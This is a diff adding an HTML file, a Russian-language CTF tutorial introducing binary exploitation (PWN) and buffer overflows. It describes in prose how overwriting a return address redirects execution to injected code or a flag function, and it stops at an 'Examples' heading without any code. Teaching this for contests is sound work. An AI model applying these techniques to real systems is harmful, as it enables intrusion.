@@ -1,0 +1,1310 @@
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=utf-8">
+<meta name=Generator content="Microsoft Word 15 (filtered)">
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+	{font-family:"Arial Unicode MS";
+	panose-1:2 11 6 4 2 2 2 2 2 4;}
+@font-face
+	{font-family:"Liberation Sans";}
+@font-face
+	{font-family:"Helvetica Neue";}
+@font-face
+	{font-family:Menlo;}
+@font-face
+	{font-family:"Source Han Sans CN";
+	panose-1:0 0 0 0 0 0 0 0 0 0;}
+@font-face
+	{font-family:"Droid Sans Devanagari";
+	panose-1:0 0 0 0 0 0 0 0 0 0;}
+ /* Style Definitions */
+ span.a
+	{mso-style-name:Нет;}
+span.Hyperlink0
+	{mso-style-name:"Hyperlink\.0";
+	color:#E4AE0A;}
+p.a0, li.a0, div.a0
+	{mso-style-name:"По умолчанию";
+	margin:0in;
+	font-size:11.0pt;
+	font-family:"Helvetica Neue",serif;
+	color:black;}
+.MsoChpDefault
+	{font-size:10.0pt;}
+ /* Page Definitions */
+ @page WordSection1
+	{size:595.3pt 841.9pt;
+	margin:56.7pt 56.7pt 56.7pt 56.7pt;}
+div.WordSection1
+	{page:WordSection1;}
+ /* List Definitions */
+ ol
+	{margin-bottom:0in;}
+ul
+	{margin-bottom:0in;}
+-->
+</style>
+
+</head>
+
+<body lang=EN-US link="#000000" vlink=fuchsia style='word-wrap:break-word'>
+
+<div class=WordSection1>
+<h1>
+<p class=a0 style='margin-bottom:2.0pt'><b><span lang=FR style='font-size:20.0pt;
+font-family:"Times New Roman",serif;color:#454545'>Exploiting / PWN. </span></b><b><span
+style='font-size:20.0pt;font-family:"Times New Roman",serif;color:#454545'>Автор:
+Раимов Хасан</span></b></p>
+</h1>
+<p class=a0 style='margin-bottom:2.0pt'><b><span lang=FR style='font-size:14.0pt;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></b></p>
+
+<p class=a0 style='line-height:150%'><b><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Exploiting</span></b><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;или&nbsp;</span><b><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Pwn</span></b><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;(&quot;</span><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>бинарная
+эксплуатация</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&quot;, &quot;</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>эксплойтинг</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&quot;,
+&quot;пвн&quot;) </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>— это категория задач</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>в которых</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, как правило, </span><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>нужно
+искать и эксплуатировать уязвимости в скомпилированных приложениях</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>. </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>Чаще всего это уязвимости
+повреждения памяти </span><span style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>(memory corruption).</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Эта
+категория в каком</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>-</span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>то смысле противопоставляется категории </span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Web, </span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>в которой обычно стоит
+задача взломать приложение на языке высокого уровня </span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>(типа PHP), т.е. </span><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>всё
+происходит на уровне интерпретации скрипта</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, а не на уровне физической памяти. </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Однако</span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>порой в категорию </span><span style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Pwn </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>включают и приложения на скриптовых языках</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>. </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>Это может быть</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, к примеру, </span><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>обход
+песочницы </span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>(jail) </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>на языке </span><span style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>Python. </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Песочницей называют ограниченную среду</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>в которой разрешены только
+определённые команды</span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>. </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Целью решения таска обычно является обойти это ограничение и
+прочитать какую</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>-</span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>то конфиденциальную информацию </span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>(флаг).</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Надо
+отметить</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>что в последние годы тематика </span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>CTF-соревнований заметно укоренилась именно в области пвна. </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>На топовых соревнованиях задачи зачастую очень сложные</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>и их решают известные
+профессионалы</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>исследователи</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>разработчики кибероружия</span><span lang=FR style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>.
+Например, одним из сильнейших пвнеров (и цтферов вообще) </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>является&nbsp;</span><span lang=FR><a
+href="https://en.wikipedia.org/wiki/George_Hotz"><span class=Hyperlink0><span
+lang=DE style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+text-decoration:none'>https://en.wikipedia.org/wiki/George_Hotz</span></span></a></span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, активно участвовавший в цтфах в 2013-2014 годах. </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Сильнейшей командой является команда </span><span
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>PPP (Plaid Parliament of Pwning) </span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>родом из университета </span><span lang=PT style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>CMU,
+</span><span lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>которая</span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>как нетрудно догадаться</span><span lang=FR style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>,
+тоже специализируется в пвне.</span></p>
+
+<p class=a0 style='line-height:150%'><span class=a><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;</span></span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Наиболее
+известным и распространённым случаем повреждения памяти является переполнение
+буфера</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>. </span><span lang=RU style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Если
+объяснить в двух словах</span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>переполнение буфера возникает тогда</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>когда приложение принимает
+на вход строку и записывает её в некоторую выделенную область памяти </span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>(</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>буфер</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>), </span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>недостаточно проверяя
+её длину</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Таким
+образом</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>хакер может выйти за границы буфера и переписать какие</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>-</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>то иные участки памяти</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>в которых могут быть важные
+данные</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>. </span><span lang=RU style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Классический
+способ эксплуатации — это перетирание адреса возврата </span><span
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>(return address). </span><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Это адрес
+памяти</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>, </span><span lang=RU style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>на
+который программа </span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>&quot;</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>перепрыгнет</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&quot; </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>после завершения выполнения текущей функции</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Суть
+эксплойта в том</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>что хакер записывает в буфер любой код</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>который он хочет выполнить</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>далее выходит за границу
+буфера и меняет адрес возврата на адрес буфера</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>. </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>Таким образом</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>после выхода из текущей
+функции программа перепрыгнет на буфер</span><span lang=FR style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>и выполнится код</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>который хакер туда записал</span><span lang=FR style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Обычно в
+качестве условия задачи даётся бинарник </span><span lang=FR style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>(</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>скомпилированный исполняемый файл программы</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>) </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>и адрес </span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>(хост и порт) </span><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>сервера</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>на котором этот бинарник
+висит</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>. </span><span lang=RU style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Иногда
+даётся и исходный код приложения</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>. </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Участнику нужно проанализировать приложение </span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>(</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>дизассемблировать</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>декомпилировать или читать
+исходный код</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>) </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>и разработать эксплойт</span><span lang=FR style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>,
+т.е. </span><span lang=RU style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>программу</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>которая </span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&quot;</span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>заставляет</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&quot; </span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>это уязвимое приложение
+выполнить произвольный код </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>(</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>вызвать шелл</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>). </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Далее нужно при помощи этого эксплойта заставить сервер
+организаторов выдать флаг</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>В простых
+случаях сам эксплойт может состоять всего из нескольких байт</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>. </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>Это может быть некоторое
+количество произвольных байтов для забивания буфера</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, а затем адрес какой-</span><span lang=RU style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>то
+функции</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>которая выдаёт флаг</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>. </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Если этот адрес перезапишет адрес возврата</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>программа отдаст флаг</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Иногда даже
+для относительно непростых задач эксплойт пишется в одну строчку</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>но найти саму уязвимость и
+придумать цепочку вызовов для выполнения нужного действия не так легко</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Есть книга
+Д</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>. </span><span lang=RU style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Эриксона
+</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&quot;Хакинг. </span><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Искусство
+эксплойта</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&quot; </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>в русском переводе</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>. </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>В ней очень доступно описано введение в эксплуатацию уязвимостей
+повреждения памяти</span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>. </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Также затронута сетевая безопасность и криптоанализ</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='margin-bottom:2.0pt'><b><span lang=FR style='font-size:15.0pt;
+font-family:"Times New Roman",serif;color:#454545'>Атака на переполнение буфера</span></b></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='margin-bottom:2.0pt;line-height:150%'><b><span lang=RU
+style='font-size:14.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Описание</span></b></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Ошибки
+переполнения буфера характеризуются перезаписью фрагментов памяти процесса</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>которые никогда не должны
+были быть изменены преднамеренно или непреднамеренно</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Перезапись значений </span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>IP (</span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>указатель инструкции</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>), BP (</span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>базовый указатель</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>) </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>и других регистров приводит
+к возникновению исключений</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>ошибок сегментации и других ошибок</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Обычно эти ошибки
+неожиданно завершают выполнение приложения</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Ошибки переполнения буфера
+возникают</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>когда мы работаем с буферами типа </span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>char.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Переполнение
+буфера может состоять из переполнения стека </span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>[Переполнение стека] или переполнения кучи [Переполнение кучи].</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;Мы не делаем различий между этими двумя в этой статье</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>чтобы избежать путаницы</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Нижеприведенные
+примеры написаны на языке </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>C в системе
+GNU/Linux на архитектуре x86.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='margin-bottom:2.0pt;line-height:150%'><b><span lang=RU
+style='font-size:14.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Примеры</span></b></p>
+
